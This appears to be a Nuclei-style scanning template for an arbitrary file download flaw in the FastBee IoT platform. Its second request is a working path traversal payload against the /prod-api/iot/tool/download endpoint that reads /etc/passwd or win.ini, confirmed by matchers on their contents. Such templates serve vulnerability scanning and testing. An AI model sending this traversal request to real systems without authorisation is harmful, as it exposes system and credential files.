id: poc-yaml-fastbee-download-fileread
info:
  name: 蜂信物联(FastBee)物联网平台download存在任意文件下载漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: file-read

variables:
  r_data_linux: |
    /etc/passwd
    /windows/win.ini

http:
  - raw:
      - |
        GET /prod-api/iot/tool/download HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - ""

  - raw:
      - |
        GET /prod-api/iot/tool/download?fileName=/../../../../../../../../..{{r_data_linux}} HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: or
    matchers:
      - type: word
        words:
          - "bit app support"
          - "fonts"
          - "extensions"
        condition: and
      - type: regex
        regex:
          - "root:.*:0:0:"
